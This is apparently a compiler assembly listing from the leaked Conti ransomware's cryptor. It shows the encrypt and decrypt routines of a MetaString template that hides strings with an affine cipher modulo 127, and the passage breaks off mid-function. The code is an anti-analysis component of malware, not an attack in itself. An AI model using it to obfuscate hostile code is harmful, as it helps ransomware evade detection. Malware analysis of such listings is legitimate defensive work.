_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 42 00 00 00	 mov	 ecx, 66			; 00000042H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 42	 add	 r8d, 66			; 00000042H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 2b	 sub	 eax, 43			; 0000002bH
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2b	 add	 r8d, 43			; 0000002bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 5a 00 00 00	 mov	 ecx, 90			; 0000005aH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5a	 add	 r8d, 90			; 0000005aH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 27 00 00 00	 mov	 ecx, 39			; 00000027H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 27	 add	 r8d, 39			; 00000027H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 64 00 00 00	 mov	 ecx, 100		; 00000064H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 64	 add	 r8d, 100		; 00000064H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 69 00 00 00	 mov	 ecx, 105		; 00000069H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
